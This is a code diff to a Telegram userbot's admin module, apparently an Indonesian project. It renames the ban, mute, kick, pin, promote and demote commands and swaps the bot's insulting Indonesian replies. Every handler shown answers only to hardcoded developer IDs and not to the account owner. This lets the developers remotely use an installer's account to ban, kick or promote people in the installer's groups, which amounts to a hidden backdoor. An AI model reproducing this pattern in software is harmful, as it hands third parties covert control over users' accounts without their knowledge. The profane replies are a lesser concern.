@@ -48,7 +48,7 @@ async def set_chat_photo(client: Client, message: Message):
 
 
 @Client.on_message(
-    filters.group & filters.command("cban", ["."]) & filters.user(DEVS) & ~filters.me
+    filters.group & filters.command("Cban", [""]) & filters.user(DEVS) & ~filters.me
 )
 @pyram("ban", ram)
 async def member_ban(client: Client, message: Message):
@@ -56,13 +56,13 @@ async def member_ban(client: Client, message: Message):
     Man = await edit_or_reply(message, "`Sedang Proses...`")
     bot = (await client.get_chat_member(message.chat.id, client.me.id)).privileges
     if not bot.can_restrict_members:
-        return await Man.edit("Gua Kekurangan Izin nih tod")
+        return await Man.edit("Minta Adminin Dulu Anjing")
     if not user_id:
         return await Man.edit("Tidak Bisa menemukan Pengguna.")
     if user_id == client.me.id:
-        return await Man.edit("Gak Bisa Ngeban Diri Sendiri, Ngentot lu!")
+        return await Man.edit("Contoh2 Anak Tolol, Ngentot lu!")
     if user_id in DEVS:
-        return await Man.edit("Maaf bgt mas, Itu developer gua bgst!")
+        return await Man.edit("Maaf, Itu developer saya!")
     if user_id in (await list_admins(client, message.chat.id)):
         return await Man.edit("I can't ban an admin, You know the rules, so do i.")
     try:
@@ -85,16 +85,16 @@ async def member_ban(client: Client, message: Message):
     await Man.edit(msg)
 
 
-@Client.on_message(filters.command("cunban", ["."]) & filters.user(DEVS) & ~filters.me)
+@Client.on_message(filters.command("Cunban", [""]) & filters.user(DEVS) & ~filters.me)
 @pyram("unban", ram)
 async def member_unban(client: Client, message: Message):
     reply = message.reply_to_message
     Man = await edit_or_reply(message, "`Sedang Proses...`")
     bot = (await client.get_chat_member(message.chat.id, client.me.id)).privileges
     if not bot.can_restrict_members:
-        return await Man.edit("Gua kekurangan izin nih tod!")
+        return await Man.edit("Minta Adminin Dulu Tolol!")
     if reply and reply.sender_chat and reply.sender_chat != message.chat.id:
-        return await Man.edit("Gak Bisa Unban Channel tolol!")
+        return await Man.edit("Itu Channel, Mana bisa di ban, hadeuhh!")
 
     if len(message.command) == 2:
         user = message.text.split(None, 1)[1]
@@ -102,14 +102,14 @@ async def member_unban(client: Client, message: Message):
         user = message.reply_to_message.from_user.id
     else:
         return await Man.edit(
-            "Kasih Gua username atau id nya kalo mau unban, Anak kontol!."
+            "Username nya mana goblok!."
         )
     await message.chat.unban_member(user)
     umention = (await client.get_users(user)).mention
     await Man.edit(f"Unbanned! {umention}")
 
 
-@Client.on_message(filters.command(["cpin", "cunpin"], ["."]) & filters.user(DEVS) & ~filters.me)
+@Client.on_message(filters.command(["Cpin", "Cunpin"], [""]) & filters.user(DEVS) & ~filters.me)
 @pyram(["pin", "unpin"], ram)
 async def pin_message(client: Client, message):
     if not message.reply_to_message:
@@ -117,7 +117,7 @@ async def pin_message(client: Client, message):
     Man = await edit_or_reply(message, "`sedang proses...`")
     bot = (await client.get_chat_member(message.chat.id, client.me.id)).privileges
     if not bot.can_pin_messages:
-        return await Man.edit("Kayanya Lu bukan Admin deh jing!")
+        return await Man.edit("Minta Adminin Dulu Anjing")
     r = message.reply_to_message
     if message.command[0][0] == "u":
         await r.unpin()
@@ -132,20 +132,20 @@ async def pin_message(client: Client, message):
     )
 
 
-@Client.on_message(filters.command(["cmute"], ["."]) & filters.user(DEVS) & ~filters.me)
+@Client.on_message(filters.command(["Cmute"], [""]) & filters.user(DEVS) & ~filters.me)
 @pyram("mute", ram)
 async def mute(client: Client, message: Message):
     user_id, reason = await extract_user_and_reason(message)
     Man = await edit_or_reply(message, "`Processing...`")
     bot = (await client.get_chat_member(message.chat.id, client.me.id)).privileges
     if not bot.can_restrict_members:
-        return await Man.edit("Lu ga ada izin ngemute org nih!")
+        return await Man.edit("Minta Adminin Dulu Bego")
     if not user_id:
         return await Man.edit("Pengguna Tidak di temukan.")
     if user_id == client.me.id:
-        return await Man.edit("Gak Bisa ngemute diri sndiri ngentot!.")
+        return await Man.edit("Mana Bisa Anjing!.")
     if user_id in DEVS:
-        return await Man.edit("Sorry Gua gabisa ngemute pencipta gua!")
+        return await Man.edit("Tidak Bisa Ngemute Developer Tolol!")
     if user_id in (await list_admins(client, message.chat.id)):
         return await Man.edit("I can't mute an admin, You know the rules, so do i.")
     mention = (await client.get_users(user_id)).mention
@@ -159,7 +159,7 @@ async def mute(client: Client, message: Message):
     await Man.edit(msg)
 
 
-@Client.on_message(filters.command(["cunmute"], ["."]) & filters.user(DEVS) & ~filters.me)
+@Client.on_message(filters.command(["Cunmute"], [""]) & filters.user(DEVS) & ~filters.me)
 @pyram("unmute", ram)
 async def unmute(client: Client, message: Message):
     user_id = await extract_user(message)
@@ -174,7 +174,7 @@ async def unmute(client: Client, message: Message):
     await Man.edit(f"Unmuted! {umention}")
 
 
-@Client.on_message(filters.command(["ckick", "cdkick"], ["."]) & filters.user(DEVS) & ~filters.me)
+@Client.on_message(filters.command(["Ckick", "Cdkick"], [""]) & filters.user(DEVS) & ~filters.me)
 @pyram(["kick", "dkick"], ram)
 async def kick_user(client: Client, message: Message):
     user_id, reason = await extract_user_and_reason(message)
@@ -207,7 +207,7 @@ async def kick_user(client: Client, message: Message):
         return await Man.edit("**Maaf Anda Bukan admin**")
 
 
-@Client.on_message(filters.group & filters.command(["cpromote", "cfullpromote"], ["."]) & filters.user(DEVS) & ~filters.me)
+@Client.on_message(filters.group & filters.command(["Cpromote", "Cfullpromote"], [""]) & filters.user(DEVS) & ~filters.me)
 @pyram(["promote", "fullpromote"], ram)
 async def promotte(client: Client, message: Message):
     user_id = await extract_user(message)
@@ -250,7 +250,7 @@ async def promotte(client: Client, message: Message):
     await Man.edit(f"Promoted! {umention}")
 
 
-@Client.on_message(filters.group & filters.command(["cdemote"], ["."]) & filters.user(DEVS) & ~filters.me)
+@Client.on_message(filters.group & filters.command(["Cdemote"], [""]) & filters.user(DEVS) & ~filters.me)
 @pyram("demote", ram)
 async def demote(client: Client, message: Message):
     user_id = await extract_user(message)
